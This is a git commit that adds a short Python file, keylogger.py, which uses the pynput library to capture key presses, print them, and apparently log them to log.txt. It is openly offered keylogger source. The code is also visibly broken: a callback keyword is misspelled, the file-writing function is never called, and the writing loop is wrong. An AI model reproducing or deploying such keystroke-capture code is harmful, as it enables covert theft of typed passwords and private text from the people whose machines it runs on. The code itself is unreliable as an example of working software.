af685c655691f64b31af63ac9bcf747a3bf68a74
Daniel <101124008+SnowdenGather@users.noreply.github.com>
2022-05-31 13:36:39 +0100

    Add files via upload

---
+++ keylogger.py
@@ -0,0 +1,22 @@
+import datetime
+import time
+import os
+
+
+from pynput.keyboard import Key, Listener
+
+def on_press(key):
+    print("{0} Pressionado".format(key))
+
+def write_file(keys):
+    with open("log.txt", "a") as f:
+        for key in keys:
+            f.write(keys)
+
+
+def on_realease(key):
+    if key == Key.esc:
+        return False
+
+with Listener(on_press=on_press, on_realease=on_realease) as Listener:
+    Listener.join()
